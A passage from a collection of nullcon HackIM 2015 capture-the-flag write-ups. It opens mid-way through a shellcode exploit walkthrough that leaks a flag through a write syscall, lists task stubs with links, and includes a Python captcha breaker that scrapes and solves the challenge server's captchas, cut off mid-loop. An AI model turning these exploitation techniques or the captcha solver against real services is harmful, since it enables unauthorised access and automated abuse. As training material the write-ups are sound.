0020| 0xffffd544 --> 0x0 
0024| 0xffffd548 --> 0x804a000 --> 0x8049f0c --> 0x1 
0028| 0xffffd54c --> 0x8048a52 (<__libc_csu_init+82>:   add    edi,0x1)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, 0x080489e7 in main ()
gdb-peda$ vmmap
Start      End        Perm      Name
0x08048000 0x08049000 r-xp      /home/vbox/pwn/tasks/nullcon/exploit-2/sbox
0x08049000 0x0804a000 r--p      /home/vbox/pwn/tasks/nullcon/exploit-2/sbox
0x0804a000 0x0804b000 rw-p      /home/vbox/pwn/tasks/nullcon/exploit-2/sbox
0x0804b000 0x0806c000 rw-p      [heap]
0xf7dfc000 0xf7dfe000 rw-p      mapped
0xf7dfe000 0xf7fa6000 r-xp      /lib/i386-linux-gnu/libc-2.19.so
0xf7fa6000 0xf7fa8000 r--p      /lib/i386-linux-gnu/libc-2.19.so
0xf7fa8000 0xf7fa9000 rw-p      /lib/i386-linux-gnu/libc-2.19.so
0xf7fa9000 0xf7fac000 rw-p      mapped
0xf7fac000 0xf7fb9000 r-xp      /usr/lib/i386-linux-gnu/libseccomp.so.2.1.0
0xf7fb9000 0xf7fbc000 r--p      /usr/lib/i386-linux-gnu/libseccomp.so.2.1.0
0xf7fbc000 0xf7fbd000 rw-p      /usr/lib/i386-linux-gnu/libseccomp.so.2.1.0
0xf7fd6000 0xf7fd8000 rwxp      mapped
0xf7fd8000 0xf7fdb000 rw-p      mapped
0xf7fdb000 0xf7fdc000 r-xp      [vdso]
0xf7fdc000 0xf7ffc000 r-xp      /lib/i386-linux-gnu/ld-2.19.so
0xf7ffc000 0xf7ffd000 r--p      /lib/i386-linux-gnu/ld-2.19.so
0xf7ffd000 0xf7ffe000 rw-p      /lib/i386-linux-gnu/ld-2.19.so
0xfffdd000 0xffffe000 rw-p      [stack]
gdb-peda$ x/s 0xf7fd6000
0xf7fd6000:     "AAAA\n"
gdb-peda$ x/s 0xf7fd8000
0xf7fd8000:     "d3sp3r4t3_sh3llc0d3\n"
```

We notice:

* `eax`, as predicted, points at our input
* There are two mapped regions after `libseccomp`'s memory sections
  * The first one with `rwxp` permissions, `0xf7fd6000` is in red (Don't know what that means yet) and displaying the content there (you can also use `x/20wx 0xf7fd6000`), we see our input
  * The second one with `rw-p` permissions, `0xf7fd8000` contains the flag

According to [this writeup](http://v0ids3curity.blogspot.in/2015/01/hackim-ctf-2014-exploitation-2.html) each `mmap`'ed region in current Linux ASLR is adjacent to each other, meaning that their addresses are adjacent.

This means we simply can `write` the content of this mapped region, even though we haven't leaked any addresses yet. We just have to `write` the content of our current address, stored in `eax`, plus the offset of our regions `0x2000` back to us!

We have to do the following to test this approach:

* Look up the `syscall` number from [this syscall table](http://docs.cs.up.ac.za/programming/asm/derick_tut/syscalls.html) - `4`
* Either look up the function signature [here](http://lxr.free-electrons.com/ident?i=sys_write) or just do [`man 2 write`](http://man7.org/linux/man-pages/man2/write.2.html)
* Look up the calling convention to know where the parameters are stores in x86-32/i386, e.g. [here](http://stackoverflow.com/questions/2535989/what-are-the-calling-conventions-for-unix-linux-system-calls-on-x86-64)
  * `eax` - syscall number (`4`)
  * `ebx` - first parameter, `fd` (`1`==[`stdout`](https://en.wikipedia.org/wiki/File_descriptor))
  * `ecx` - second parameter `buf` (`addr(ecx+0x2000)`, since `ecx` is equal `eax` when calling `eax` as seen in our `gdb-peda` output)
  * `edx` - third parameter `count` (`0x100` - write `256` bytes back to us)

Since this writeup is written after the CTF did end, we have to run the binary locally and bind it to a port.

This is done using `socat tcp-l:4000,reuseaddr,fork exec:"strace ./sbox"` as [this writeup](https://www.pawpetersen.dk/nullcon-hackim-2015-exploitation-question-2/) suggests.
To create the shellcode, we can either use `radare2`'s assemble function `pa`:

![](./r2-pa.png)

Note that `radare2` isn't perfect yet - e.g. as we can see it can't assemble `int 0x80`! (Or maybe I don't know how to use it :D)

Or we can use `nasm` to either print opcodes instruction by instruction as done in [this writeup](http://v0ids3curity.blogspot.in/2015/01/hackim-ctf-2014-exploitation-2.html) or provide an assembly source file to be translated into opcodes by `nasm` as done [in this writeup](http://barrebas.github.io/blog/2015/01/11/hackim-ctf-sbox/).

The last option is using `pwntools` [`shellcraft`](pwntools.readthedocs.org/en/latest/shellcraft/i386.html) module, tested and demonstrated [here](https://github.com/ctfs/write-ups-2015/tree/master/icectf-2015/binary-exploitation/what).

Let's run the exploit, shall we?

"Server side":

```bash
$ ls
flag.txt  sbox
$ socat tcp-l:4000,reuseaddr,fork exec:"strace ./sbox"

```

"Attacker side":

[This python script](./solve.py) does the job:

![](./pygmentize-exploit.png)

```bash
$ p solve.py 
[+] Opening connection to localhost on port 4000: Done
[+] Recieving all data: Done (256B)
[*] Closed connection to localhost port 4000
d3sp3r4t3_sh3llc0d3
\x00\x00\x00\x00\x00[...]
```

The flag is `d3sp3r4t3_sh3llc0d3`.

## Other write-ups and resources

* <http://www.pawpetersen.dk/nullcon-hackim-2015-exploitation-question-2/>
* <https://ctf-team.vulnhub.com/hackim-2015-exploit-200/> or <http://barrebas.github.io/blog/2015/01/11/hackim-ctf-sbox/>
* <http://v0ids3curity.blogspot.in/2015/01/hackim-ctf-2014-exploitation-2.html>
# nullcon HackIM 2015: Exploitation 300

**Category:** Exploitation
**Points:** 300
**Author:**
**Description:**

> 54.163.248.69:9003
> 
>	[Binary](sample3.tar.gz)

## Write-up

(TODO)

## Other write-ups and resources

* <http://v0ids3curity.blogspot.in/2015/01/hackim-ctf-2014-exploitation-3.html>
# nullcon HackIM 2015: Exploitation 400 - 1

**Category:** Exploitation
**Points:** 400
**Author:**
**Description:**

> 54.163.248.69:9004
> 
>	[Binary](MentalNote.tar.gz)

## Write-up

(TODO)

## Other write-ups and resources

* <https://ctf-team.vulnhub.com/hackim-2015-exploit-400/> or <http://barrebas.github.io/blog/2015/01/11/hackim-ctf-mentalnote/>
* <http://v0ids3curity.blogspot.in/2015/01/hackim-ctf-2014-exploitation-4.html>
* [Vietnamese](https://babyphd.net/2015/01/hackim-2014-re-pwn-mentalnote/)
# nullcon HackIM 2015: Exploitation 400 - 2

**Category:** Exploitation
**Points:** 400
**Author:**
**Description:**

> 54.163.248.69:9005
>
>	[Binary](mixme.tar.gz)

## Write-up

(TODO)

## Other write-ups and resources

* <https://ctf-team.vulnhub.com/hackim-2015-exploit-400-2/> or <http://barrebas.github.io/blog/2015/01/11/hackim-ctf-mixme-writeup/>
* <http://v0ids3curity.blogspot.in/2015/01/hackim-ctf-2014-exploitation-5.html>
* <http://piggybird.net/2015/01/hackim-2015-exploitation-question-5-400-points/> (down - no cached version available)
* [Vietnamese](https://babyphd.net/2015/01/write-up-hackim-ctf-mixme-pwn5/)
* <https://gist.github.com/g05u/f09524d770f8249bde6d>
* <http://pastebin.com/JXX4SZMe>
# nullcon HackIM 2015: Forensics 100

**Category:** Forensics
**Points:** 100
**Author:**
**Description:**

> We have been closely watching the movements of a wanted suspect.However, there is another incident which points the evidence towards him on last christmas @ 10PM. Can you pls help us to identify whether he is hidden in any cave? 
> 
> Flag format : flag{md5sum(lower\_case(cavename))}
>
>	[6A0904E45C0A03019F297AF089A801FC](6A0904E45C0A03019F297AF089A801FC)

## Write-up

(TODO)

## Other write-ups and resources

* <https://ctf-team.vulnhub.com/hackim-2015-forensics-100/>
# nullcon HackIM 2015: Forensics 200

**Category:** Forensics
**Points:** 200
**Author:**
**Description:**

> A friend of mine says his SSH server is super secure. Can you pls help me find the hidden message ?
> 
> 54.165.191.231:2222
> 
> Flag format: flag{flag}

## Write-up

(TODO)

## Other write-ups and resources

* <https://ctf-team.vulnhub.com/hackim-2015-forensics-200/>
# nullcon HackIM 2015: Forensics 300

**Category:** Forensics
**Points:** 300
**Author:** mehimansu
**Description:**

> Find the hidden key
>
> Flag format: flag{flag}
>
> [FOR-300](FOR-300)

## Write-up

(TODO)

## Other write-ups and resources

* <https://ctf-team.vulnhub.com/hackim-2015-forensics-300/>
* <http://blog.tinduong.pw/nullcon-hackim-2014-write-ups/>
# nullcon HackIM 2015: Forensics 500

**Category:** Forensics
**Points:** 500
**Author:**
**Description:**

> This image contains a pagefile. Can you tell the size of it (in bytes)? 
>
> Password to open archive:Synergy@123
>
> Flag format: flag{flag}
>
>	Image.rar

## Write-up

by [pyrocat101](https://github.com/pyrocat101)

The image file is a Windows memory dump generated by virtual machine manager.

Get strings in the image and search for page file size:

~~~bash
$ strings Image > str
$ grep -i pagefilesize str
PagefileSize: 0x7ff7e000
$ python -c 'print 0x7ff7e000'
2146951168
~~~

The flag is `flag{2146951168}`.


## Other write-ups and resources

* <https://zairon.wordpress.com/2015/01/19/nullcon-hackim-2015-forensics-500-writeup/>
* <http://blog.tinduong.pw/nullcon-hackim-2014-write-ups/>
* [Portuguese](https://ctf-br.org/wiki/nullcon-hackim/nullcon-hackim-2015/f500-question-4/)
# nullcon HackIM 2015: Misc 100

**Category:** Misc
**Points:** 100
**Author:**
**Description:**

> Talk to me pls @ IP PORT - 54.165.191.231:2908 
>
> Flag format: flag{flag}

## Write-up

(TODO)

## Other write-ups and resources

* <https://ctf-team.vulnhub.com/hackim-2015-misc-100/>
* <http://blog.tinduong.pw/nullcon-hackim-2014-write-ups/#result_box>
# nullcon HackIM 2015: Misc 200

**Category:** Misc
**Points:** 200
**Author:**
**Description:**

> Find out whats hidden in this garbage IP PORT - 54.165.191.231:2909 
>
> Flag format: flag{flag}

## Write-up

(TODO)

## Other write-ups and resources

* [Portuguese](https://ctf-br.org/wiki/nullcon-hackim/nullcon-hackim-2015/m200-question-2/)
# nullcon HackIM 2015: Misc 300

**Category:** Misc
**Points:** 300
**Author:**
**Description:**

> Do the math ! 
>
> Flag format: flag{flag}
>
>	[MISC-300-41.1.2.pdf](MISC-300-41.1.2.pdf)

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# nullcon HackIM 2015: Misc 400

**Category:** Misc
**Points:** 400
**Author:**
**Description:**

> Find out the hidden gift in this SERVER : PORT - 54.165.191.231:2910 
>
> Flag format: flag{flag}

## Write-up

(TODO)

## Other write-ups and resources

* <https://ctf-team.vulnhub.com/hackim-2015-misc-400/>
# nullcon HackIM 2015: Programming Question 1

**Category:** Programming
**Points:** 100
**Author:**
**Description:**

>Get Aldrich Killian's Coordinates:
>
>This is the story of Tony Stark, called Iron Man, and Aldrich Killian, the creator of the Extremis virus and the founder of Advanced Idea Mechanics. Iron Man is bound to capture or kill Aldrich Killian to save the world. Definitely it is not easy task as Aldrich Killian is genius Hacker himself. Iron Man has turned to you to help him. On his first mission, Iron Man has got a brain scan image of one of the Extremis Virus. The scan image is stored in the following image file. You need to get the flag to know the possible coordinates of Aldrich Killian.
>
>Decode the following image to get the flag:
>
>	[Image File](image1.png)

## Write-up

(TODO)

## Other write-ups and resources

* <https://ctf-team.vulnhub.com/hackim-2015-programming-100/>
* <http://blog.tinduong.pw/nullcon-hackim-2014-write-ups/#more-122>
* [Portuguese](https://ctf-br.org/wiki/nullcon-hackim/nullcon-hackim-2015/p100-question-1/)
# nullcon HackIM 2015: Programming Question 2

**Category:** Programming
**Points:** 200
**Author:**
**Description:**

>Teleport Iron Man:
>
>Iron Man got the coordinates of Aldrich Killian. According to the coordinates, Aldrich Killian is hiding in a planet called Mann's planet in a distant galaxy. Iron Man found out a secret quantum communication channel from Earth to Mann's planet, generally used by Aldrich Killian. However, Iron Man is novice in Quantum Computing and Teleportation. Help Iron Man to teleport himself to the remote and hostile planet.
>
>Following is the short summary of how you can help Iron Man.
>
>Consider two parties named Alice and Bob (you). Alice wants to transmit a qubit to Bob security without revealing anything to Eve. Eve can intercept any classical communication channels. PS:You know who I am talking about, isn't it?
>
>Suppose, Alice wants to send a qubit |t> = a|0> + b|1> to Bob. For simplicity, a qubit can also be described as a pair/tuple (a, b).
>
>As the Quantum Communication Channel, Alice and Bob each possess one qubit of an entangled pair
>
>|s0> = (1/sqrt(2)) (|00> + |01>)
>
>So the start state is three-qubit quantum state:
>
>|t> * |s0> = (1/sqrt(2)) (a|0⟩(|00⟩ + |11⟩) + b|1⟩(|00⟩ + |11⟩)) = (1/sqrt(2)) (a|000⟩ + a|011⟩ + b|100⟩ + b|111⟩)
>
>(Please note * is the tensor product operator).
>
>As a result, Alice controls the first two qubits and Bob controls the last one.
>To transmit the qubit |t>, there are two steps involved:
>
>*Step 1:*
>
>Alice apply (Cnot * I) operator followed by (H * I * I) on the 3 qubit state (|t> * |s0>) i.e. (H * I * I)(Cnot * I)(|t⟩*|s0⟩)
>
>The result of this will be entangled 3 qubit state.
>
>*Step 2:*
>
>Alice measures the first two qubits and obtains one of the four standard basis states |00⟩, |01⟩, |10⟩, and |11⟩ with some probability. Depending on the result of her measurement, the quantum state of Bob’s qubit will be projected to certain ensemble of 1-qubit states. Alice sends the result of her measurement as two classical bits 00 or 01 or 10 or 11 to Bob.
>
>*Step 3*
>
>When Bob receives the two classical bits from Alice, he knows how the state of his half of the entangled pair compares to the original state of Alice’s qubit. Bob can reconstruct the original state of Alice’s qubit, |t⟩, by applying the appropriate decoding transformation (unitary operators) to his qubit, originally part of the entangled pair.
>
>So this is how Bob got a single qubit from Alice.
>
>### N Qubit Teleportation Problem
>
>Alice wants to transmit n qubits to Bob. Let us say n qubits are
>
>|t1> = = a1|0> + b1|1> |t2> = = a2|0> + b2|1> ... |tn> = = an|0> + bn|1>
>
>Assume, Alice and Bob need to share n Entangled pairs |s1>, |s2> .. |sn> between each other.
>
>|s1> = (1/sqrt(2)) (|00> + |01>) |s2> = (1/sqrt(2)) (|00> + |01>) ... |sn> = (1/sqrt(2)) (|00> + |01>) 
>
>
>##Input
>
>First line will specify n, number of qubits to transfer by Alice to Bob. Each of the next n lines contain 2 bits information, i.e. 00 or 01 or 10 or 11, sent from Alice to Bob via classical communication channel. Each of next n lines contain pair of integers separated by a space. Each pair of integers describe result of Bobs qubit once Alice perform measurement on here two qubits as part of Step 2.
>
>##Output
>
> Capture the Flag. The Flag is the summary of qubits Bob has received from Alice.
>Summary(|t1>, |t2> ... |tn>) = [(a1 * 1 + b1) + (a2 * 2 + b2) + .. + (an * n + bn) ] % 1000000007 where as we described |ti> = ai|0> + bi|1> is final ith qubit Bob has received from Alice, * is classical multiply operator
>
>## Example 
>
>### Sample Input
>
>2
>
>00
>
>00
>
>1 2
>
>4 8
>
>### Sample Flag
>
>19
>
>Bob has received following qubits from Alice:
>
>(1 2)
>
>(4 8)
>
>So the flag is 19 = ((1 * 1 + 2) + (4 *  2 + 8) ) % 1000000007
>
>	[Image File](input2.txt)

## Write-up

by [vvvverre](https://github.com/vvvverre)

This problem introduces us some basic knowledge about Quantum Computing. The Quantum State Transformations is a traditional application. And we know Bob needs to use different decoding operator depending on the value of the bits he received from Alice. Consider the expansion formula with the quantum gates substituted with the help of [wikipedia](http://en.wikipedia.org/wiki/Quantum_gate):
```
   (H * I * I)(Cnot * I)(|t⟩*|s0⟩)
 = (H * I * I)(1/sqrt(2)) (a|000⟩+a|011⟩+b|110⟩+b|101⟩)
 = 1/2 (a(|000⟩+|011⟩+|100⟩+|111⟩)+b(|010⟩+|001⟩-|110⟩-|101⟩))
 = 1/2 (|00⟩(a|0⟩+b|1⟩)+|01⟩(a|1⟩+b|0⟩+|10⟩(a|0⟩-b|1⟩)+|11⟩(a|1⟩-b|0⟩)))
 ```

Then Bob could know this state table:
```
State         Bits received  Decodeing
(a|0⟩+b|1⟩    00             I matrix
(a|1⟩+b|0⟩    01             X matrix
(a|0⟩-b|1⟩    10             Z matrix
(a|1⟩-b|0⟩    11             Y matrix
```

So not Bob can decode all a[i] and b[i]. For the first state, do nothing, for the second state, `swap(a[i], b[i])`, for the third state, `b[i] = -b[i]`, for the last state, `swap(a[i], b[i])` and then `b[i] = -b[i]`.

After the decoding, just get the modulo of the sum with one pass.

The flag is `307287759`.

## Other write-ups and resources

* [Quantum Computing: A Gentle Introduction](http://goo.gl/5o0Atj)
# nullcon HackIM 2015: Programming Question 3

**Category:** Programming
**Points:** 300
**Author:**
**Description:**
>Design GPS device:
>
>#Problem Statement
>Now, Iron Man is on Mann planet. He need to go to the city of Aldrich Killian to capture him. Mann planet is extremely large and Iron Man has to travel a great distance to reach the City. In order to make the travel reliable, Iron Man wishes to design a GPS device, offcoarse, current GPS devices won't work on Mann planet. Help Iron Man to design GPS.
>
>Mann Planet has following four satellites:
>A with 120.5 (degree Azimuth) and 79.57 (degree Elevation)
>B with 102.14 (degree Azimuth) and 65.84 (degree Elevation)
>C with 112.8 (degree Azimuth) and 76.42 (degree Elevation)
>D with 134.25 (degree Azimuth) and 82.38 (degree Elevation)
>
>Each satellite broadcast GPS packet at regular intervals containing the time when the signal was broadcasted in Unix epoch time format. Let us denote t(A) to be a time when satellite A sent its signal. Let us further assume all the satellites send signals always at the same time.
>
>The GPS device receive the signal at another time (in device clock). GPS device may not have its clock synced with satellit clock. However, you may assume that all the satellites clocks are in sync the Univeral clock. Let b denote the drift of the GPS device clock at some point of time.
>
>##Input
>Last known measurements
>t(A, 0) = 1420473358
>t(B, 0) = 1420473357
>t(C, 0) = 1420473350
>t(D, 0) = 1420473351
>
>r(A, 0) = 1420473358.119169
>r(B, 0) = 1420473357.1193693
>r(C, 0) = 1420473350.109696
>r(D, 0) = 1420473351.1183686
>
>Last known coordinates of Iron Man
>E(0) = 1711639.22240641
>N(0) = 5908759.74357952
>U(0) = 1679966.70406394
>
>Current Measurements:
>t(A, 1) = 1420476958
>t(B, 1) = 1420476957
>t(C, 1) = 1420476950
>t(D, 1) = 1420476951
>
>r(A, 1) = 1420476958.129169
>r(B, 1) = 1420476957.1343694
>r(C, 1) = 1420476950.1201959
>r(D, 1) = 1420476951.1333687
>
>Speed of Light:
>299792458 m/s
>Output:
>delta(E)
>delta(N)
>delta(U)
>delta(b)
>
>All measurements should have exactly 3 decimal places. For example, in python, "%.3f" % (delta(E)) is a good approximation for delta(E)
>
>Submit you flag as:
>
>str(delta(E)) || ':' || str(delta(N) || ':' || str(delta(U)) || ':' || str(delta(b))
>
>with no spaces and where || is the string concatnation operator
>
>	[Input File](input3.txt)

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# nullcon HackIM 2015: Programming Question 4

**Category:** Programming
**Points:** 400
**Author:**
**Description:**

>Decrypt Aldrich Killian City Map:
>
>#Problem Statement
>Iron Man is inside city of Aldrich Killian. Iron Man has got hold of the city map, however, the city map is encrypted with a key. Without decryption of the city map, it is impossible to catch Aldrich Killian. As Aldrich Killian is also a algorithm lover, he has obfuscated the key using the following problem.
>
>Consider a character set of size m, M = {a, b, c .. A, C, ... 1, 2..}. How many words of exactly length n, call it F, you can construct, assuming that each word will not use same character at two different places?
>
>For example, consider M = {a, b, c} and n = 3
>
>1. aba, bbc are not allowed.
>2. abc, bac, cab are allowed
>
>In order to make it more challenging, each position in the word can have only predefined characters in M. Iron Man has got following image as a clue.
>
>Get the Flag. Flag is (F mod 1000000007)
>
>	[Image File](input4.png)

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# nullcon HackIM 2015: Programming Question 5

**Category:** Programming
**Points:** 500
**Author:**
**Description:**

>Capture Aldrich Killian:
>
>#Problem Statement
>
>Aldrich's city is organized as a graph of smaller towns, let the number of towns by n. There are m one way roads between towns. Each road connec two towns in one way. Aldrich has given a number to each town. Actually the number allocated to each town is the preorder number during the DFS search of the graph. The town with number 1 is the root node of the graph.
>
>More formally, G = (V, E), where |V| = n, |E| = m. Each vertex, v in V is allocated a unique number from 1 to n using preoder number of DFS traversal of the graph.
>
>Aldrich has places an enormous army in his town. Iron Man has created a strategy to defeat the army by cutting down their supply of food and other resources. As per Iron Man's research a town, say v, gets its supply of resources from a specific town, say w, such that town w satisfy following property:
>
>All the paths from root node 1 to v passes through town w. If there are more than one town with this property then w is chosen because it has the highest number among all such towns.
>
>Please note town w can supply resources to more than one town.
>
>Iron Man wants to know, given a town w, how many towns get their supply of resources from w.
>
>##Input Format:
>First line containts n (number of towns, m (number of edges) seperated by space.
>Each of the next m lines specify edges among towns. Each edge is represented by a pair "u v" i.e an edge u --> v.
>
>##Output Format:
>For each town, say w, from 1 to n in the increasing order of town number, print how many towns get their supply from w. No Space and or new line is allowed.
>
>##Example
>###Input
>5 5
>1 5
>5 3
>3 4
>2 3
>1 2
>
>###Output
>30100
>
>Town 1 supply resource to 3 towns, town 2 supply to none, town 3 supply to 1 town and so on.
>
>##Flag
>Flag is the sha1 of the expected output. We computed sha1 using the following command. cat output.txt | openssl dgst -sha1
>
>	[Input File](input5.txt)

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# nullcon HackIM CTF 2015 write-ups

* <http://ctf.nullcon.net/>
* [Scoreboard](http://ctf.nullcon.net/scoreboard.php)

## Completed write-ups

* [crypto-1](crypto-1)
* [crypto-2](crypto-2)
* [exploit-1](exploit-1)
* [exploit-2](exploit-2)
* [forensics-4](forensics-4)
* [programming-2](programming-2)
* [web-5](web-5)

## External write-ups only

* [exploit-3](exploit-3)
* [exploit-4](exploit-4)
* [exploit-5](exploit-5)
* [forensics-1](forensics-1)
* [forensics-2](forensics-2)
* [forensics-3](forensics-3)
* [misc-1](misc-1)
* [misc-2](misc-2)
* [misc-4](misc-4)
* [programming-1](programming-1)
* [reversing-1](reversing-1)
* [reversing-2](reversing-2)
* [reversing-4](reversing-4)
* [reversing-5](reversing-5)
* [trivia-1](trivia-1)
* [trivia-2](trivia-2)
* [trivia-3](trivia-3)
* [trivia-4](trivia-4)
* [trivia-5](trivia-5)
* [web-1](web-1)
* [web-3](web-3)
* [web-4](web-4)

## Missing write-ups

* [crypto-3](crypto-3)
* [crypto-4](crypto-4)
* [crypto-5](crypto-5)
* [misc-3](misc-3)
* [programming-3](programming-3)
* [programming-4](programming-4)
* [programming-5](programming-5)
* [reversing-3](reversing-3)
* [web-2](web-2)
# nullcon HackIM 2015: reversing 100

**Category:** reversing
**Points:** 100
**Author:**
**Description:**


> Lets get started. Warm-up!
>	[Sample](boo.tar.gz)

## Write-up

(TODO)

## Other write-ups and resources

* [Vietnamese](https://babyphd.net/2015/01/hackim-2014-re-pwn-mentalnote/)
# nullcon HackIM 2015: reversing 200

**Category:** reversing
**Points:** 200
**Author:**
**Description:**

>Not that Bob!
>	[Sample](upx.zip)

## Write-up

(TODO)

## Other write-ups and resources

* <https://ctf-team.vulnhub.com/hackim-2015-reversing-200/>
* <http://blog.tinduong.pw/nullcon-hackim-2014-write-ups/>
* [Vietnamese](https://babyphd.net/2015/01/hackim-2014-re-pwn-mentalnote/)
# nullcon HackIM 2015: reversing 300

**Category:** reversing
**Points:** 300
**Author:**
**Description:**

>Sherlock's Method: Its made of Wood not Metal
>	[Sample](sm.tar.gz)

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# nullcon HackIM 2015: reversing 400

**Category:** reversing
**Points:** 400
**Author:**
**Description:**

>Here you go!
>	[Sample](fin64.tar.gz)

## Write-up

(TODO)

## Other write-ups and resources

* <http://blog.tinduong.pw/nullcon-hackim-2014-write-ups/>
* [Vietnamese](https://babyphd.net/2015/01/hackim-2014-re-pwn-mentalnote/)
# nullcon HackIM 2015: reversing 500

**Category:** reversing
**Points:** 500
**Author:**
**Description:**

> Be captain Sparrow and reach the shipwreck cove in the caribbean.
>	[Sample](cso.tar.gz)

## Write-up

(TODO)

## Other write-ups and resources

* <http://blog.tinduong.pw/nullcon-hackim-2014-write-ups/>
* [Vietnamese](https://babyphd.net/2015/01/hackim-2014-re-pwn-mentalnote/)
* <http://pastebin.com/qpAMCiMJ>
# nullcon HackIM 2015: Trivia Question 1

**Category:** Trivia
**Points:** 100
**Author:**
**Description:**

> Let's hack and rename Reuben to \_\_\_.

## Write-up

(TODO)

## Other write-ups and resources

* [Spanish](https://blog.ka0labs.net/post/20/)
# nullcon HackIM 2015: Trivia Question 2

**Category:** Trivia
**Points:** 200
**Author:**
**Description:**

> Image represents a randomness from the last night. Help us find the flag hidden behind.
>
>	[Trivia-200.PNG](Trivia-200.PNG)

## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/d4rwinb0ts/ctf-writeups/blob/master/2015-hack-im/trivia_2/solution.md>
# nullcon HackIM 2015: Trivia Question 3

**Category:** Trivia
**Points:** 300
**Author:**
**Description:**

>What is the version of Sharepoint running on an US based server with following details:
>ServerName: CEI02 
>Instance Name: Sharepoint. ?

## Write-up

(TODO)

## Other write-ups and resources

* <https://ctf-team.vulnhub.com/hackim-2015-trivia-300/>
* [Spanish](https://blog.ka0labs.net/post/20/)
# nullcon HackIM 2015: Trivia Question 4

**Category:** Trivia
**Points:** 400
**Author:**
**Description:**

>For a n-gram where n=32 find the number with highest frequency in the string, given in the image. Find the synonym of this string.
>
>	[Trivia-400.jpg](Trivia-400.jpg)

## Write-up

(TODO)

## Other write-ups and resources

* <https://ctf-team.vulnhub.com/hackim-2015-trivia-400/>
* [Spanish](https://blog.ka0labs.net/post/20/)
# nullcon HackIM 2015: Trivia Question 5

**Category:** Trivia
**Points:** 500
**Author:**
**Description:**

>Holy :O :O :O
>
>	[holy.txt](holy.txt)

## Write-up

(TODO)

## Other write-ups and resources

* <https://ctf-team.vulnhub.com/hackim-2015-trivia-500/>
* <http://blog.tinduong.pw/nullcon-hackim-2014-write-ups/>
# nullcon HackIM 2015: Web Question 1

**Category:** Web
**Points:** 100
**Author:**
**Description:**

>To Err is human! 
>
>An error may not always be an indication of something wrong, but can be the stepping stone of success. 
>
>Flag format: flag{flag}
>
>[TToErrisHuman.php](http://54.165.191.231/ToErrisHuman.php)

## Write-up

(TODO)

## Other write-ups and resources

* <https://ctf-team.vulnhub.com/hackim-2015-web-100/>
* [Spanish](https://blog.ka0labs.net/post/20/)
* [Portuguese](https://ctf-br.org/wiki/nullcon-hackim/nullcon-hackim-2015/w100-question-1/)
# nullcon HackIM 2015: Web Question 2

**Category:** Web
**Points:** 200
**Author:**
**Description:**

>Let's see how good is your Chemistry with the Computer's. 
>
>Schools may be hard, annoying and irritating but admit it, you're going to miss it now!!
>
>Flag format: flag{flag}
>
>[chemistryCheck.php](http://54.165.191.231/chemistryCheck.php)

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# nullcon HackIM 2015: Web Question 3

**Category:** Web
**Points:** 300
**Author:**
**Description:**

>Find the keys to your home. [Flag: Updated]
>
>[loop.php](http://54.165.191.231/loop.php)

## Write-up

(TODO)

## Other write-ups and resources

* <https://ctf-team.vulnhub.com/hackim-2015-web-300/>
* [Spanish](https://blog.ka0labs.net/post/20/)
* [Portuguese](https://ctf-br.org/wiki/nullcon-hackim/nullcon-hackim-2015/w300-question-3/)
# nullcon HackIM 2015: Web Question 4

**Category:** Web
**Points:** 400
**Author:**
**Description:**

>Buy Nullcon Pass For Free. 
>
>Flag format: flag{flag}
>
>[nullcon.html](http://54.165.191.231/nullcon.html)

## Write-up

(TODO)

## Other write-ups and resources

* <https://ctf-team.vulnhub.com/hackim-2015-web-400/>
* [Spanish](https://blog.ka0labs.net/post/20/)
* [Portuguese](https://ctf-br.org/wiki/nullcon-hackim/nullcon-hackim-2015/w400-question-4/)
# nullcon HackIM 2015: Web Question 5

**Category:** Web
**Points:** 500
**Author:**
**Description:**

>Break the captcha! 
>
>Flag format: flag{flag}
>
>[captcha.php](http://54.165.191.231/captcha.php)

## Write-up

by [pyrocat101](https://github.com/pyrocat101)

Notice that captcha uses the fixed font family and characters are upper- and lower-case letters
at fixed location. So the idea is to crop letters and label them for use. Whenever we get a
new captcha, crop out the letters, and compare those letters against our labelled ones.

The script that is used to get and label samples:

~~~python
#!/usr/bin/env python
from PIL import Image
import requests
import string
from StringIO import StringIO

num_requests = 2
img_dim = 11
top = 23
left = 4
gap = 30

for j in range(0, num_requests):
    r = requests.get('http://54.165.191.231/imagedemo.php')
    im = Image.open(StringIO(r.content))
    for i in range(0, 6):
        res = im.crop((left + gap * i, top, left + img_dim + 30 * i, top + img_dim))
        res.show()
        filename = raw_input("Label this image: ")
        if filename in string.lowercase:
            res.save('lower_' + filename + '.png')
        elif filename in string.uppercase:
            res.save('upper_' + filename + '.png')
        else:
            continue
~~~

Run the script and manually label for a couple times until we get 52 images of labelled
letters that is of size 11x11. Then whenever we get a new captcha, we crop out letters
inside, compare the letter against every labelled letter image, and guess the one that
has the minimal score. The score is the sum of pixel-wise difference between two images:

~~~python
import sys
from glob import glob
from PIL import Image
import requests
from cStringIO import StringIO
from io import BytesIO

WIDTH = 11
HEIGHT = 11

def recognize(im, letters):
    # compare im against all letters and find the best score one.
    best_score = sys.maxint
    best_letter = None
    for letter, letter_img in letters.iteritems():
        score = 0
        for x in xrange(WIDTH):
            for y in xrange(HEIGHT):
                score += abs(im.getpixel((x, y)) - letter_img.getpixel((x, y)))
        if score < best_score:
            best_score = score
            best_letter = letter
    return best_letter

def noise_cancel(im):
    return im.convert('L').point(lambda x: 0 if x < 128 else 255, '1')

def load_letters():
    letters = {}
    files = glob('*.png')
    for f in files:
        original = Image.open(f)
        im = noise_cancel(original)
        letter = f[10:11]
        letters[letter] = im
    return letters

IMG_DIM = 11
TOP = 23
LEFT = 4
GAP = 30

def crop_captcha(im):
    return [
        im.crop((LEFT + GAP * i, TOP, LEFT + IMG_DIM + 30 * i, TOP + IMG_DIM))
        for i in xrange(0, 6)
    ]

def solve_captcha(im, letters):
    captcha = map(noise_cancel, crop_captcha(im))
    return ''.join(
        recognize(c, letters)
        for c in captcha
    )

IMG_URL = 'http://54.165.191.231/imagedemo.php'
VERIFY_URL = 'http://54.165.191.231/verify.php'

if __name__ == '__main__':
    letters = load_letters()
    s = requests.Session()
    cookies = None
    while True:
        # pull the image
        r = s.get(IMG_URL, cookies=cookies)
        im = Image.open(StringIO(r.content))
        # made the guess
        guess = solve_captcha(im, letters)
